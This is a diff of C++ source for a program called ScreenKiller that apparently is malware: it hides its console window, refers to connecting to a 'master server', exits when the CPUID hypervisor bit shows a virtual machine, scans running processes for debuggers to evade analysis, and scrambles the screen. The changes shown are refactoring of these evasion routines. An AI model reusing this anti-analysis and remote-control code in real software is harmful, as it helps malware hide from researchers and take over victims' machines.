@@ -9,9 +9,9 @@ VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);
 
 ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) 
 {
-	size_t sz;
+	size_t size;
 	char *path;
-	_dupenv_s(&path, &sz, "temp");
+	_dupenv_s(&path, &size, "temp");
 
 	this->m_temp_path = path;
 }
@@ -23,7 +23,6 @@ ScreenKiller::~ScreenKiller()
 
 void ScreenKiller::deploy()
 {
-	
 	this->m_alive = true;
 
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -80,19 +79,21 @@ bool ScreenKiller::connect_to_master_server()
 
 void ScreenKiller::exit_if_vm_cpuid()
 {
-	int registers[4];
+	int32_t registers[4];
 
 	__cpuid(registers, 1);
-	if (static_cast<bool>((registers[2] >> 31) & 0x1))
+	bool hypervisor_bit = static_cast<bool>((registers[2] >> 31) & 0x1);
+
+	if (hypervisor_bit)
 	{
-		exit(1337);
+		exit(DEBUG_OR_VM_EXITCODE);
 	}
 }
 
 void ScreenKiller::exit_if_debugged()
 {
 	if (this->is_debugged1() || this->is_debugged2())
-		exit(1337);
+		exit(DEBUG_OR_VM_EXITCODE);
 }
 
 bool ScreenKiller::is_debugged1()
@@ -122,25 +123,26 @@ bool ScreenKiller::is_debugged2()
 		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 		processInformation = { sizeof(PROCESSENTRY32W) };
 		if (!(Process32FirstW(processList, &processInformation)))
-			return false;
-		else
 		{
-			do
-			{
-				for (const wchar_t* debugger : debuggersFilename)
-				{
-					processName = processInformation.szExeFile;
-					if (_wcsicmp(debugger, processName) == 0) 
-					{
-						return true;
-					}
-				}
-				if (_wcsicmp(pogan_name, processInformation.szExeFile) == 0)
-				{
-					count_instances++;
-				}
-			} while (Process32NextW(processList, &processInformation));
+			return false;
 		}
+		
+		do
+		{
+			for (const wchar_t* debugger : debuggersFilename)
+			{
+				processName = processInformation.szExeFile;
+				if (_wcsicmp(debugger, processName) == 0) 
+				{
+					return true;
+				}
+			}
+			if (_wcsicmp(pogan_name, processInformation.szExeFile) == 0)
+			{
+				count_instances++;
+			}
+		} while (Process32NextW(processList, &processInformation));
+
 		CloseHandle(processList);
 
 		return count_instances > 1;
@@ -203,5 +205,4 @@ VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj)
 
 	DeleteDC(hdcMemory);
 	DeleteObject(hBitmap);
-	free(screen_props);
 }
